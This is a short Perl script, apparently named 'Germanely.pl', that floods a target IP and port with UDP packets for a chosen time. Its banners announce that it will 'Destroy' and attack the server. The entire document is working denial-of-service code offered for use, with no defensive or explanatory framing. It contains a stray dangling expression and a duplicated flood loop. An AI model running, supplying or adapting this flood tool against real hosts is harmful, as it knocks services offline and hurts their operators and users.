#!/usr/bin/perl

use Socket;
use strict;
use Term::ANSIColor;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Usage: perl Germanely.pl ip port 65500 time $ip\n";
$endtime = time() + ($time ? $time : 10000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "\e[32m[*] You're Using Germanely Script\n\e[0m";
print "\e[34m[*] You're about to Destroy $ip:$port for $time seconds\n\e[0m";
print "\e[31m[*] Attacking Server $ip\n\e[0m";
print "\e[32m[*] With $size Bytes\n\e[0m";
print "\e[31m[*] CTRL+C to stop the Attack\n\e[0m";

($size ? "$size-byte" : "sent") . " " .
($time ? "for $time seconds" : "") . "\n";
 
for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
